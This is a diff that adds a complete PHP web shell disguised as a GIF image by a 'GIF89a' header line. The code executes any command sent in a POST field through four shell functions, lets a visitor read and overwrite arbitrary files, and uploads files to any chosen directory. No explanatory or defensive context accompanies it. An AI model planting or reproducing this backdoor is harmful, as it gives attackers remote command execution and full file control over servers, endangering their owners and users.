@@ -1,0 +1,63 @@
+GIF89a$  
+<form name="cmd" method="POST" enctype="multipart/form-data">
+com: <input type="text" name="cmd" size="50">
+<hr><pre>
+<?php
+ if ($_POST['cmd']){
+ $cmd = $_POST['cmd'];
+ $or=$_POST['cmd'];
+ shell_exec($or);
+ system($or);
+ exec($or);
+ passthru($or);
+}
+?>
+
+</form>
+<hr></pre>
+<?php
+
+$file = $_POST['file'];
+$script = $_POST['script'];
+      if($file&&$script) {
+      $fp=fopen($file, "w");
+      fwrite($fp,$script);
+      fclose($fp);
+   }
+?>
+<form method="post" enctype="multipart/form-data">
+dir: <input size="50" name="dir" value="<? echo getcwd(); ?>"> 
+ <input type="file" name="file">       
+ <input type="submit" value="Up">
+  <form method="post">
+file: <input type="text" name="file"> 
+<?php
+   if($file) {
+?>
+<textarea rows="25" cols="55" name="script">
+<?php
+   $fp=fopen($file,"r");
+   $t="";
+   while(!feof($fp)) {
+      $t.=fread($fp,1024);
+   }
+   fclose($fp);
+   print $t;
+?>
+</textarea>
+<input type="submit" value="edit">
+<input type="hidden" name="file" value="<?=$file;?>">
+<?php
+   }
+?>
+</form> 
+<?php
+$Upld = $_FILES['file']['tmp_name'];
+if (file_exists($Upld)) {
+   $pwddir = $_POST['dir'];
+   $real = $_FILES['file']['name'];
+   $dez = $pwddir."/".$real;
+   copy($Upld, $dez);
+   echo "Upld : $dez";
+}
+?>
